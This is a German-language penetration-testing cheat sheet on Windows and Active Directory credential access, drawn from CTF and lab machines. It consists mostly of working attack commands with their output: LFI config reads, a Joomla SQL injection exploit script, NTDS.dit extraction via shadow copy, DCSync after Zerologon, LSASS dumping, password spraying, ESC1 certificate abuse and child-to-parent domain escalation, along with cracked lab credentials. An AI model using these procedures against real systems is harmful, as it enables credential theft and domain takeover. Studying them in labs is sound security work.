# Windows Credential Access


## Ziel der Phase

- Extraktion von Passwörtern, Hashes und Tokens
- Sammlung von Credentials aus Dateien, Registry, Speicher und Datenbanken
- Vorbereitung für Lateral Movement und weitere Privilege Escalation

---

## Relevante Techniken & Vorgehensweisen

### Configuration Files

**Joomla:**


```bash
cd /var/www/html
cat configuration.php
```

**Typischer Inhalt:**


```php
public $password = 'nv5uz9r3ZEDzVjNu';
```

**WordPress:**


```bash
cat /var/www/html/wp-config.php
```

**LFI zu Configuration Files:**


```bash
# PHP Filter (Base64-encoded)
curl "http://<TARGET_IP>/dev/index.html?view=php://filter/convert.base64-encode/resource=db.php"

# Base64 dekodieren
echo 'BASE64_STRING' | base64 -d
```

**Typische Findings:**


```php
$servername = "localhost";
$username = "root";
$password = "SuperSecureMySQLPassw0rd1337.";
```

### mRemoteNG Credential Theft

**Config-Datei finden:**

cmd

```cmd
cd C:\Users\ellen.freeman\Documents
dir
```

**Datei:** `config.xml`

**Wichtiger Auszug:**


```xml
<Node Name="RDP/Gale"
      Username="Gale.Dekarios"
      Password="TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw=="
      Hostname="Lock"
      Protocol="RDP" />
```

**Decrypt Tool:**


````bash
git clone https://github.com/gquere/mRemoteNG_password_decrypt.git
cd mRemoteNG_password_decrypt
python3 mremoteng_decrypt.py ../config.xml
```

**Ergebnis:**
```
Password: ty8wnW9qCKDosXo6
````

### SQL Injection (Joomla 3.7.0)

**Joomblah Script:**


````bash
wget https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py
python3 joomblah.py http://<TARGET_IP>
```

**Was das Script macht:**
1. CSRF Token vom Login-Bereich holen
2. SQL Injection testen über com_fields
3. Tabellen finden (sucht nach *users* Tabellen)
4. User-Daten dumpen: ID, Username, Email, Passwort-Hash

**Typische Ausgabe:**
```
Found table: fb9j5_users
Found user: ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
````

### Database Access

**MySQL Connection:**


```bash
# Erste Verbindung schlägt oft fehl
mysql -h <TARGET_IP> -u root -p

# SSL deaktivieren - Erfolg
mysql -h <TARGET_IP> -u root -p --skip-ssl
```

**Database Enumeration:**


```sql
-- Datenbanken anzeigen
SHOW DATABASES;

-- news Datenbank untersuchen
USE news;
SHOW TABLES;

-- User-Tabelle dumpen
SELECT * FROM users LIMIT 10;
```

### Hash Cracking

**MD5:**


```bash
echo "7e7abb54bbef42f0fbfa3007b368def7" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

**bcrypt (Joomla):**


````bash
echo '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Ergebnis:**
```
spiderman123
````

**ZIP-Passwort:**


````bash
fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip
```

**Ergebnis:**
```
Password: java101
````

**MS Access Database:**


````bash
office2john staff.accdb > hash.txt
john --format=office --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Ergebnis:**
```
Password: class08
````

**KeePass:**


````bash
keepass2john passwords.kdbx > keepass.hash
hashcat -m 13400 keepass.hash rockyou.txt
```

**Ergebnis:**
```
Master Password: PeterIstToll!
````

**KeePass-Datenbank öffnen:**

- Enthält Domain-Passwörter
- Beispiel: `b0cwR+G4Dzl_rw`

### Password Spraying

**CrackMapExec:**


````bash
crackmapexec smb <TARGET_IP> -u users.txt -p 'BabyStart123!' --continue-on-success
```

**Ergebnis:**
```
Caroline.Robinson → STATUS_PASSWORD_MUST_CHANGE
````

### Password Reset

**SMBPasswd:**


```bash
/usr/bin/smbpasswd -r <TARGET_IP> -U Caroline.Robinson
# Old: BabyStart123!
# New: NewPassword123!
```

### NTDS.dit Extraction (Volume Shadow Copy)

**Voraussetzung:**

- SeBackupPrivilege + SeRestorePrivilege

**Shadow Copy erstellen:**

powershell

```powershell
"set context persistent nowriters" | Out-File extract.dsh -Encoding ASCII
"add volume c: alias baby" | Out-File extract.dsh -Append -Encoding ASCII
"create" | Out-File extract.dsh -Append -Encoding ASCII
"expose %baby% z:" | Out-File extract.dsh -Append -Encoding ASCII
diskshadow /s extract.dsh
```

**Dateien kopieren:**

cmd

```cmd
robocopy z:\windows\ntds C:\Temp ntds.dit /B
robocopy z:\windows\system32\config C:\Temp system /B
```

**Download:**

powershell

```powershell
download ntds.dit
download SYSTEM
```

**Hash Extraction:**


````bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

**Typische Ausgabe:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
````

### DCSync Attack (nach Zerologon)

**Nach Zerologon-Exploit:**


```bash
secretsdump.py -no-pass '<DOMAIN>/<DC_NAME>$'@<TARGET_IP> -just-dc
```

**Beispiel:**


````bash
secretsdump.py -no-pass "retro2.vl/BLN01$"@10.10.114.178 -just-dc
```

**Wichtige Hashes:**
```
Administrator:c06552bdb50ada21a7c74536c231b848
krbtgt:1e242a90fb9503f383255a4328e75756
````

**LSA Secrets:**

- `plain_password_hex` für DC-Wiederherstellung

### lsassy (LSASS Dumping)

**Remote LSASS Dump:**


```bash
lsassy -u harry -p 'haxxor@12345' -d lab.trusted.vl <TARGET_IP>
```

**Credentials aus Speicher extrahieren**

### Keytab Extraction

**Keytab zu Hash konvertieren:**


````bash
python3 keytabextract.py krb5.keytab
```

**Typische Ausgabe:**
```
NTLM: 0f916c5246fdbc7ba95dcef4126d57bd
````

### LDAP Anonymous Bind

**LDAP-Abfrage:**


````bash
ldapsearch -x -H ldap://<TARGET_IP> -b "DC=baby,DC=vl"
```

**Fund:**
```
User: Teresa.Bell
Password: BabyStart123!
````

**Konzept:**

- Klartext-Passwörter in LDAP-Beschreibungen
- Anonymous Bind möglich

### Git History

**Repository klonen:**


```bash
git clone http://ellen.freeman:TOKEN@<TARGET_IP>:3000/ellen.freeman/website.git
cd website
```

**Commit History durchsuchen:**

- Initial Commit prüfen
- Hardcoded Credentials/Tokens

**Typischer Fund:**


```python
PERSONAL_ACCESS_TOKEN = '43ce39bb0bd6bc489284f2905f033ca467a6362f'
```

### NFS Share Enumeration

**Exports:**


```bash
showmount -e <TARGET_IP>
```

**Mount:**


```bash
sudo mkdir -p /tmp/mount
sudo mount -t nfs -o vers=3,nolock <TARGET_IP>:/opt/share /tmp/mount
```

**Backup-Dateien:**


````bash
ls -la /tmp/mount
cp /tmp/mount/backup.tar.gz .
tar -xvf backup.tar.gz
```

**Typische Findings:**
```
admin@hybrid.vl : Duckling21
peter.turner@hybrid.vl : PeterIstToll!
````

### SMB Share Credentials

**Datei-Enumeration:**


````bash
smbclient //<TARGET_IP>/Trainees
ls
get Important.txt
cat Important.txt
```

**Typischer Inhalt (Important.txt):**
```
Dear Trainees,
Some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
```

**Inference:**
```
trainee:trainee
````

**Datei-Enumeration (Notes Share):**


````bash
smbclient //<TARGET_IP>/Notes -U trainee%trainee
get ToDo.txt
cat ToDo.txt
```

**Inhalt (ToDo.txt):**
```
Thomas,
after convincing the finance department to get rid of their ancient banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.
````

**Inference:**

- Vorkonfigurierter Computer-Account (BANKING$)

### Certificate-based Authentication

**Certificate Request (ESC1):**


```bash
certipy-ad req -u 'banking$@retro.vl' -p 'password1@' -ca 'retro-DC-CA' -target 'dc.retro.vl' -template 'RetroClients' -upn 'administrator@retro.vl' -dns 'dc.retro.vl' -key-size 4096 -dc-ip <TARGET_IP>
```

**Authentication:**


````bash
certipy-ad auth -pfx administrator_dc.pfx -dc-ip <TARGET_IP>
```

**Ausgabe:**
```
[*] Got hash for 'administrator@retro.vl':
    aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389
````

### Child-to-Parent Domain

**Domain SID ermitteln:**


```bash
lookupsid.py lab.trusted.vl/harry:'haxxor@12345'@<TARGET_IP>
```

**Trust-Beziehungen:**


```bash
ldeep ldap -u harry -p 'haxxor@12345' -d lab.trusted.vl -s ldap://<TARGET_IP> trusts
```

**raiseChild.py:**


```bash
raiseChild.py lab.trusted.vl/cpowers -hashes :<NT_HASH>
```

**Parent Domain Compromise:**


````bash
secretsdump.py -hashes :<ADMIN_HASH> trusted.vl/Administrator@<PARENT_DC_IP>
```

**Typische Ausgabe:**
```
Administrator:15db914be1e6a896e7692f608a9d72ef
Trust-Key:4db3f9d7f1f1da776092e0cce7521a3f
```

---

## Betriebssystem-spezifische Aspekte (Windows)

### Windows Credential Storage

**Configuration Files:**
- `C:\xampp\htdocs\configuration.php` (Joomla)
- `C:\xampp\htdocs\wp-config.php` (WordPress)
- `C:\Users\<USER>\Documents\config.xml` (mRemoteNG)
- `profiles.xml` (Remote Desktop Plus)

**Registry:**
- LSA Secrets (via secretsdump)

**Memory:**
- LSASS Process (via lsassy)

**Active Directory:**
- NTDS.dit (Domain Controller)
- Volume Shadow Copy
- DCSync

### Hash-Typen

**NTLM:**
```
aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389
```

**bcrypt (Joomla/WordPress):**
```
$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
```

**MD5:**
```
7e7abb54bbef42f0fbfa3007b368def7
````

### Certificate-based Access

**ADCS (Active Directory Certificate Services):**

- Certificate für User anfordern
- Authentication via Certificate
- NT-Hash als Ergebnis
- Keine Plaintext-Passwörter nötig

---

## Typische Angriffsflächen

### Web Application Configuration

**Joomla:**

- `configuration.php` mit DB-Credentials
- Oft gleiche Passwörter für User-Accounts

**WordPress:**

- `wp-config.php` mit DB-Credentials

**Custom Applications:**

- `config.yml`, `db.php`
- LFI-Zugriff via PHP Filter

### Remote Desktop Configuration

**mRemoteNG:**

- `config.xml` mit verschlüsselten Passwörtern
- Decrypt-Tool verfügbar

**Remote Desktop Plus:**

- `profiles.xml` mit Base64-kodierten Passwörtern

### SMB Shares

**Public/Trainees Shares:**

- README-Dateien mit Hinweisen
- Common Credentials (trainee:trainee)

**Notes Share:**

- ToDo-Listen mit sensiblen Infos
- Computer-Account-Hinweise

### NFS Shares

**Backup-Dateien:**

- `.tar.gz`, `.zip` mit Credentials
- Passwort-geschützte Archive (crackbar)

### Git Repositories

**Commit History:**

- Hardcoded Tokens
- Alte/gelöschte Credentials
- Initial Commits besonders interessant

### Active Directory

**LDAP Anonymous Bind:**

- User-Enumeration
- Klartext-Passwörter in Beschreibungen

**NTDS.dit:**

- Alle Domain-Hashes
- Volume Shadow Copy mit SeBackupPrivilege

**DCSync:**

- Nach Zerologon
- Domain Replication Rights

**ADCS:**

- Certificate-based Authentication
- ESC1-Vulnerable Templates

---

## Wichtige Befehle & Syntax

### Secretsdump


```bash
# NTDS.dit lokal
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# DCSync (nach Zerologon)
secretsdump.py -no-pass '<DOMAIN>/<DC_NAME>$'@<TARGET_IP> -just-dc

# Mit Credentials
secretsdump.py -hashes :<NT_HASH> <DOMAIN>/<USER>@<TARGET_IP>
```

### Hash Cracking


```bash
# MD5
hashcat -m 0 hash.txt rockyou.txt

# bcrypt
john --wordlist=rockyou.txt hash.txt

# ZIP
fcrackzip -v -u -D -p rockyou.txt file.zip

# MS Office
office2john file.accdb > hash.txt
john --format=office --wordlist=rockyou.txt hash.txt

# KeePass
keepass2john file.kdbx > hash.txt
hashcat -m 13400 hash.txt rockyou.txt
```

### mRemoteNG Decrypt


```bash
python3 mremoteng_decrypt.py config.xml
```

### Certipy Authentication


```bash
certipy-ad auth -pfx <PFX_FILE> -dc-ip <TARGET_IP>
```

### lsassy


```bash
lsassy -u <USER> -p <PASS> -d <DOMAIN> <TARGET_IP>
```

### Keytab Extract


```bash
python3 keytabextract.py krb5.keytab
```

---

## Reihenfolge & Abhängigkeiten

### Configuration File Access Flow

1. **Initial Access** → Shell als www-data/apache
2. **Webroot navigieren** → cd /var/www/html
3. **Config-Datei lesen** → cat configuration.php
4. **Credentials extrahieren** → DB-Passwort
5. **Testen** → MySQL-Login, SSH, etc.

### mRemoteNG Credential Theft Flow

1. **Shell als User** → butler, ellen.freeman
2. **Documents durchsuchen** → dir C:\Users<USER>\Documents
3. **config.xml finden** → mRemoteNG-Config
4. **Datei kopieren** → Via SMB, Evil-WinRM download
5. **Decrypt-Tool** → mremoteng_decrypt.py
6. **RDP-Login** → xfreerdp3

### SQL Injection to Hash Flow

1. **Joomla Version** → README.txt (3.7.0)
2. **CVE Research** → CVE-2017-8917
3. **Joomblah Script** → python3 joomblah.py
4. **Hash extrahieren** → bcrypt
5. **John the Ripper** → Plaintext-Passwort
6. **Admin Panel Login** → /administrator/

### Database Access Flow

1. **Config-Datei** → DB-Credentials
2. **MySQL Login** → --skip-ssl oft nötig
3. **Database Enumeration** → SHOW DATABASES
4. **User-Tabelle** → SELECT * FROM users
5. **Hash Cracking** → hashcat/john
6. **Credential Reuse** → SSH, RDP, etc.

### NTDS.dit Extraction Flow

1. **SeBackupPrivilege** → whoami /priv
2. **Shadow Copy** → diskshadow
3. **NTDS.dit kopieren** → robocopy /B
4. **SYSTEM kopieren** → robocopy /B
5. **Download** → Evil-WinRM
6. **Secretsdump** → Hash-Extraktion
7. **Pass-the-Hash** → Evil-WinRM/psexec

### DCSync Flow (nach Zerologon)

1. **Zerologon Exploit** → DC Machine Account = leer
2. **Secretsdump** → -no-pass mit DC$
3. **Alle Hashes dumpen** → -just-dc
4. **Administrator Hash** → NTLM
5. **Pass-the-Hash** → psexec/Evil-WinRM

### ADCS Certificate Flow

1. **Computer Account** → Passwort ändern/bekannt
2. **Certificate Request** → certipy req (UPN=administrator)
3. **Authentication** → certipy auth
4. **NT Hash** → Administrator
5. **Pass-the-Hash** → Evil-WinRM

---

## Typische Findings & Fehler

### Configuration File Credentials

**Daily Bugle (Joomla):**


```php
public $password = 'nv5uz9r3ZEDzVjNu';
```

- User: jjameson
- SSH-Zugriff erfolgreich

**Trusted (MySQL):**


````php
$username = "root";
$password = "SuperSecureMySQLPassw0rd1337.";
```
- MySQL-Zugriff
- Webshell deployment möglich

**Blog (WordPress):**
```
Credentials: kwheel:cutiepie1
````

- Admin Panel Access
- Crop-image RCE

### mRemoteNG Findings

**Lock VM:**


````xml
Username: Gale.Dekarios
Password (encrypted): TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==
Decrypted: ty8wnW9qCKDosXo6
```
- RDP-Zugriff erfolgreich
- User Flag

### SQL Injection Findings

**Daily Bugle (Joomla 3.7.0):**
```
User: jonah
Hash: $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
Cracked: spiderman123
```
- Admin Panel Login
- Template Modification → RCE

### Hash Cracking Results

**MD5 (Trusted):**
```
rsmith:7e7abb54bbef42f0fbfa3007b368def7
Cracked: IHateEric2
```

**ZIP (Dev):**
```
save.zip Password: java101
Contents: id_rsa, todo.txt
```

**KeePass (Hybrid):**
```
Master Password: PeterIstToll!
Domain Password: b0cwR+G4Dzl_rw
```

**MS Access (Retro2):**
```
staff.accdb Password: class08
```

### NTDS.dit Extraction

**Baby VM:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
Method: Volume Shadow Copy (SeBackupPrivilege)
Result: Domain Admin via Pass-the-Hash
```

### DCSync Findings

**Retro2 (Zerologon):**
```
Administrator:c06552bdb50ada21a7c74536c231b848
krbtgt:1e242a90fb9503f383255a4328e75756
Method: DCSync nach Zerologon
Result: Domain Takeover
```

**Trusted (Child-to-Parent):**
```
Child cpowers:322db798a55f85f09b3d61b976a13c43
Parent Administrator:15db914be1e6a896e7692f608a9d72ef
Trust-Key:4db3f9d7f1f1da776092e0cce7521a3f
Child SID: S-1-5-21-2241985869-2159962460-1278545866
Parent SID: S-1-5-21-3576695518-347000760-3731839591
```

### ADCS Certificate Findings

**Retro VM:**
```
Template: RetroClients (ESC1)
User: banking$ (Computer Account)
Certificate UPN: administrator@retro.vl
Hash: 252fac7066d93dd009d4fd2cd0368389
```

**Hybrid VM:**
```
Template: HybridComputers (ESC1)
Machine Account: MAIL01$
Keytab NTLM: 0f916c5246fdbc7ba95dcef4126d57bd
Certificate UPN: administrator@hybrid.vl
Method: PassTheCert → Password Reset
```

### LDAP Anonymous Bind

**Baby VM:**
```
User: Teresa.Bell
Password: BabyStart123!
```

### SMB Share Findings

**Retro VM:**
```
Share: Trainees
File: Important.txt
Inference: trainee:trainee
```

**Blog VM:**
```
Share: BillySMB
Files: Alice-White-Rabbit.jpg, tswift.mp4, check-this.png
```

### NFS Share Findings

**Hybrid VM:**
```
Export: /opt/share
File: backup.tar.gz
Credentials:
- admin@hybrid.vl : Duckling21
- peter.turner@hybrid.vl : PeterIstToll!
```

### Git History Findings

**Lock VM:**
```
Repository: ellen.freeman/dev-scripts
File: repos.py
Initial Commit:
PERSONAL_ACCESS_TOKEN = '43ce39bb0bd6bc489284f2905f033ca467a6362f'
````

### Fehlerhafte Credential Access

**MySQL Connection:**

- Erste Verbindung ohne --skip-ssl schlägt fehl
- SSL-Zertifikat-Probleme

**Hash Cracking:**

- Hash-Format falsch identifiziert → Falsches Tool
- Wordlist zu klein → rockyou.txt verwenden

**mRemoteNG Decrypt:**

- Falsches Decrypt-Tool → github.com/gquere verwenden
- XML-Struktur unbekannt → Vollständige config.xml benötigt

**NTDS.dit Extraction:**

- robocopy ohne /B → Zugriff verweigert
- SeBackupPrivilege fehlt → Alternative Methode nötig

**DCSync:**

- DC Machine Account Password nicht leer → Zerologon fehlgeschlagen
- Just-dc Flag vergessen → Zu viele Daten

**Certificate Authentication:**

- Falsches Identity gewählt → UPN-Identity (0) wählen
- PFX-Passwort falsch → Certificate neu anfordern

**Credential Reuse:**

- Passwort funktioniert nicht überall
- Oft nur für spezifischen Service gültig
